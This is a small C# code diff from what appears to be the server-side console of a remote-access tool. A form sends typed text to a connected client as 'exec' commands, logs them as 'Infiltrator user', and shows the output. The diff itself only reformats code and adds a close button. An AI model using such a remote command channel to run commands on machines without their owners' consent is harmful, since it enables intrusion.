@@ -28,10 +28,11 @@ namespace Server
         {
             string command = textBox1.Text.Trim();
 
-            if (!string.IsNullOrEmpty(command)) {
+            if (!string.IsNullOrEmpty(command))
+            {
 
                 ServerSocket.setWaiting(true);
-                ServerSocket.SendCommand(_idCliente, "exec "+command,Channel.CommandOutput);
+                ServerSocket.SendCommand(_idCliente, "exec " + command, Channel.CommandOutput);
                 richTextBox1.AppendText("Infiltrator user > " + command + "\n");
                 textBox1.Clear();
             }
@@ -46,6 +47,11 @@ namespace Server
             }
 
             richTextBox1.AppendText(output + Environment.NewLine);
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            this.Close();
         }
     }
 }
